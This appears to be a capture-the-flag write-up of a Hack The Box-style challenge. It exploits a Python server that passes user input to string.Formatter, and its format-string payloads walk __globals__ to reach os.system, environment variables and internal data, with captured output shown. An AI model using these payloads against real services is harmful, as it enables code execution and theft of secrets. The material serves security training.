> We successfully hacked into the secret Git server of the HideAndSec,
> and we found the source code of this Python script being used in remote,
> can you help us exploit it, gather their access credentials and arrest these criminals?

> Author: **[mxrch][author-profile]**

## Interacting with the CC

## The code

```python
text = interface.get_input()
requested_commands = [fname for _, fname, _, _ in Formatter().parse(text) if fname]
secure_commands = SecureCommands(requested_commands)
```

```python
def __init__(self, requested_commands):
    self.requested_commands = requested_commands

    # I saw this post which was saying that using a dispatcher to use
    # functions from a dictionary is pretty safe
    # https://softwareengineering.stackexchange.com/a/182095

    self.dispatcher = {
        "whoami": self.whoami,
        "get_time": self.get_time,
        "get_version": self.get_version
    }

    self.verify_commands()

def verify_commands(self):
    for cmd in self.requested_commands:
        if cmd == "debug":
            import pdb; pdb.set_trace()
        if cmd in self.dispatcher and callable(self.dispatcher[cmd]):
            self.dispatcher[cmd] = self.dispatcher[cmd]()
```

They could have stored the results and served plain strings, instead:

```python
# To optimize resources, we only call functions when they are requested
```

## Exploiting the format string

```python
heyhey {whoami.__init__}
heyhey {whoami.__globals__['__builtins__'].__import__('os').getuid}
heyhey {whoami.__init__.__class__.__bases__[0].__subclasses__()}
heyhey {whoami.__init__.__globals__["__builtins__"]}
heyhey {whoami.__init__.__globals__['__builtins__']['__import__']('os')}
heyhey {whoami.__init__.__globals__['__builtins__']['__import__']('os').system('ls')}
```

For the parser, in `{whoami.__globals__}`, the key is `whoami`.

```python
heyhey {whoami.__globals__}
# heyhey {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f7de7901340>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/main.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'os': <module 'os' from '/usr/local/lib/python3.8/os.py'>, 'subprocess': <module 'subprocess' from '/usr/local/lib/python3.8/subprocess.py'>, 'socketserver': <module 'socketserver' from '/usr/local/lib/python3.8/socketserver.py'>, 'datetime': <class 'datetime.datetime'>, 'Formatter': <class 'string.Formatter'>, 'Station': <class '__main__.Station'>, 'SecureCommands': <class '__main__.SecureCommands'>, 'SecureBridge': <class '__main__.SecureBridge'>, 'ServerContext': <class '__main__.ServerContext'>, 'address': ('0.0.0.0', 1337), 'server': <__main__.ServerContext object at 0x7f7de77cb940>}
```

The aim is to chain the exploit until we reach gold! The chain has to be
structured so that the parser identifies the key as "whoami", to maintain
the match `"whoami" => SecureCommands.whoami`.

```python
{whoami.__globals__[os].environ}
# environ({'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': 'miscvipere-413156-6f7c57c9cf-pjjgh', 'LANG': 'C.UTF-8', 'GPG_KEY': 'E3FF2839C048B25C084DEBE9B26995E310250568', 'PYTHON_VERSION': '3.8.11', 'PYTHON_PIP_VERSION': '21.1.3', 'PYTHON_GET_PIP_URL': 'https://github.com/pypa/get-pip/raw/a1675ab6c2bd898ed82b1f58c486097f763c74a9/public/get-pip.py', 'PYTHON_GET_PIP_SHA256': '6665659241292b2147b58922b9ffe11dda66b39d52d8a6f3aa310bc1d60ea6f7', 'KUBERNETES_SERVICE_PORT': '443', 'KUBERNETES_SERVICE_PORT_HTTPS': '443', 'KUBERNETES_PORT': 'tcp://10.245.0.1:443', 'KUBERNETES_PORT_443_TCP': 'tcp://10.245.0.1:443', 'KUBERNETES_PORT_443_TCP_PROTO': 'tcp', 'KUBERNETES_PORT_443_TCP_PORT': '443', 'KUBERNETES_PORT_443_TCP_ADDR': '10.245.0.1', 'KUBERNETES_SERVICE_HOST': '10.245.0.1', 'HOME': '/home/ctf'})
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
# {'bank_accounts': {'official': 10000, 'offshore': 1983388028}, 'total_infected': 275470559, 'viperebot_new_victims_pairs_ids': ['4e1a50c6-9eab-47d0-b268-89c4b70402ce', '825bd6da-eacc-4090-b537-02598e022694', 'fb63b301-58a1-456a-a47b-f43e253b7ada', '7b1d2d11-1394-48e5-8f37-93f0df979736', '226bca53-e670-4cc7-bfe5-8fa64f9a0d67']}}
{whoami.__globals__[server].__dict__[RequestHandlerClass].__dict__}
# {'__module__': '__main__', 'get_loaded_commands': <function Station.get_loaded_commands at 0x7f9177cf65e0>, 'get_input': <function Station.get_input at 0x7f9177cfb820>, 'print': <function Station.print at 0x7f9177cfb8b0>, 'handle': <function Station.handle at 0x7f9177cfb940>, '__doc__': None}
{whoami.__globals__[SecureCommands].__dict__}
{whoami.__globals__[SecureCommands].__dict__[verify_commands].__code__}
```

```
ValueError: Only '.' or '[' may follow ']' in format field specifier
```

[author-profile]: https://app.hackthebox.com/users/181024
[stackoverflow]: https://softwareengineering.stackexchange.com/a/182095
